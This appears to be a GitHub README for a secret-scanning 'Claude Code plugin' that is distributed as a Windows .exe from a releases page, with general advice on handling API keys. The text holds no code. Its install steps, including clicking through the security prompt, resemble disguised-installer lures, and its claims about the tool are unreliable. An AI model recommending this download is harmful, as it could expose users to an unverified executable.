# 🛡️ security-sweep-plugin - Find hidden security risks in code

[![Download security-sweep-plugin](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Ksx9797/security-sweep-plugin/releases)

## What is this tool?

The security-sweep-plugin finds mistakes in your computer projects. Many people accidentally save private passwords or secret keys in their files. This can lead to hackers stealing your information. This plugin scans your work automatically to find these risks. You do not need to understand complex security rules to use it. It works with your Claude Code setup to keep your projects safe.

## Why use this tool?

Most security software requires training or expensive classes. This plugin changes that approach. It looks for patterns that indicate a vulnerability. A vulnerability is a weak spot in your code. By finding these spots early, you protect your data before you share or publish your work. It tracks common errors that appear in web projects and mobile applications. You save time because the tool checks your work while you build.

## 📋 System requirements

- Windows 10 or Windows 11
- At least 4 gigabytes of RAM
- An active installation of Claude Code
- An internet connection for initial setup

## 🚀 How to download and install

1. Visit the [official release page](https://github.com/Ksx9797/security-sweep-plugin/releases) to access the installer.
2. Look for the file ending in `.exe` under the latest release section.
3. Click the filename to start the download to your computer.
4. Locate the downloaded file in your downloads folder.
5. Double-click the file to open the installation wizard.
6. Follow the instructions on the screen.
7. Confirm that you want to run the software if your computer shows a security prompt.
8. The installer finishes automatically once the progress bar completes.

The installation adds the necessary files to your system path. You do not need to restart your computer, but you should refresh your terminal if you have one open.

## 🛠️ How to run a security scan

After you install the plugin, it connects directly to your Claude Code workspace. You do not need to open a separate window or interface.

1. Open the folder where your project resides.
2. Right-click inside your project folder.
3. Select "Open in Terminal" or "Open in Command Prompt."
4. Type `sweep-scan` into the window and press the Enter key.
5. Watch the screen as the tool reviews your files.

The tool indicates progress with a status bar. It shows the number of files checked and any items that need your attention.

## 🔍 Understanding scan results

The plugin categorizes findings to help you decide what to fix first. 

- **Critical:** This category shows exposed API keys or clear text passwords. You must address these items immediately. An API key is a digital key that gives others access to your accounts.
- **Warning:** This category points to common mistakes. Examples include weak settings or old code libraries that have known bugs.
- **Info:** This category suggests best practices. It helps you keep your code clean and organized.

If the plugin finds a risk, it gives you the name of the file and the exact line number. You can open that file, look at the line, and delete or replace the sensitive data.

## ✅ Maintaining project safety

Make a habit of running a scan before you finish a project. Security is a continuous process. New files often contain new secrets or configuration errors. Frequent scans reduce the risk of accidents. You can run the command as often as you like. There are no limits on the number of scans or the size of your projects.

## ⚙️ Plugin configuration

You can refine how the tool works by editing the settings file. Look for a file named `sweep-config.json` in your user directory. You can open this file with any text editor, such as Notepad.

- **Ignore files:** If you have files that you do not want to scan, add their names to the ignore list in the settings file.
- **Scan depth:** You can tell the tool to check deep into your subfolders or keep it to the main project folder.
- **Alert levels:** You can choose to hide information-level alerts if you only want to see critical security holes.

Save the file after you make changes. The scanner uses your new settings the next time you type the scan command.

## ❓ Common questions

**Do I need a paid account to use this?**
No. This plugin is free for everyone.

**Does my code leave my computer?**
The plugin performs all scanning on your local machine. Your code stays on your hard drive, and the tool does not send your private data to a remote server. 

**What happens if I find a false positive?**
Sometimes the tool flags a line that looks like a password but is actually just a sample string. If this happens, you can add that specific line to your ignore list. 

**Is this only for web developers?**
The plugin covers a wide range of needs. While it excels at web and mobile projects, it finds security issues in many types of programming tasks. 

**Do I need to update the tool?**
You should check the release page once per month. Updates often include new rules that help the plugin find more advanced threats.

## 📈 Security best practices

Always treat your API keys like house keys. Never store them in your project files if you plan to upload your work to the internet. If you find a key in your code, assume it is compromised. Revoke that key through your service provider and create a new one. The plugin helps you find these leaks, but good habits prevent them in the first place. Use environment variables to load your keys at runtime instead of hardcoding them into your files. This provides an extra layer of protection for your projects.